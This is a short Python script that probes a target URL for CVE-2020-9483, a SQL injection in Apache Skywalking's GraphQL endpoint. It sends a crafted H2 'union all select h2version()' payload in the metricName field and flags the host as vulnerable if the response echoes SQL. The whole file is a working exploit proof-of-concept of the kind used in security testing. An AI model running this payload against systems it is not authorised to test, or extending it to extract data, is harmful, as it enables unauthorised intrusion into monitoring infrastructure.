"""
@Author: exiashow
@File: skywalking_sql_injection.py
@Date: 2024/3/6 17:13
@Desc: CVE-2020-9483, Apache Skywalking 8.3.0 SQL Injection Vulnerability
@Summary: Application performance monitor tool for distributed systems, especially designed for microservices,
          cloud native and container-based (Docker, Kubernetes, Mesos) architectures.
          in GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.
"""

import requests
import sys
import json

headers = {
    'User-Agent': 'Mozilla/5.0 ('
}

payload = {
    "query": "query queryLogs($condition: LogQueryCondition){queryLogs(condition: $condition){total,logs{serviceId,serviceName,isError,content}}}",
    "variables": {"condition": {
        "metricName": "INFORMATION_SCHEMA.USERS union all select h2version())a where 1=? or 1=? or 1=? --",
        "endpointId": "1", "traceId": "1", "state": "ALL", "stateCode": "1", "paging": {"pageSize": 10}}}}


class SkywalkingSQLInjection(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        final_url = self.url + ":8080/graphql"
        r = requests.post(final_url, headers=headers, data=json.dumps(payload), timeout=3)

        try:
            if r.status_code == 200 and "select" in r.text:
                return "[Warning] Skywalking vulnerability discovered: CVE-2020-9483"
            else:
                return None
        except requests.exceptions.ConnectionError as e:
            pass

if __name__ == '__main__':
    fallingSword = SkywalkingSQLInjection(sys.argv[1])
    print(fallingSword.run())